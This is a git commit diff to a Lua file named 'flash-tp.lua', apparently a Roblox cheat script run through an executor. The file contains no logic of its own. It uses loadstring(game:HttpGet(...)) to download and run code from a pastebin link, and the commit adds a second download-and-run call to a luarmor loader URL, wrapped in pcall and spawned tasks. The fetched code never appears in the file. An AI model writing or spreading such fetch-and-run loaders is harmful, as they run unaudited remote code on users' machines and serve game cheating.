1141ff3720ac6767ffebda5969466ab73e28733e
arshwasser <hettesheimerjonte@gmail.com>
2026-04-07 13:50:08 +0200

    Update flash-tp.lua

--- flash-tp.lua
+++ flash-tp.lua
@@ -1,1 +1,21 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/rNKYMDpg"))()
+-- unique name damit nix conflicted
+if not getgenv().ColdHubLoader_v3 then
+    getgenv().ColdHubLoader_v3 = true
+
+    -- Script 1
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/rNKYMDpg"))()
+        end)
+    end)
+
+    -- kleine delay für stability
+    task.wait(0.5)
+
+    -- Script 2
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/0576443e53d848eb8bd8458de6a25011.lua"))()
+        end)
+    end)
+end
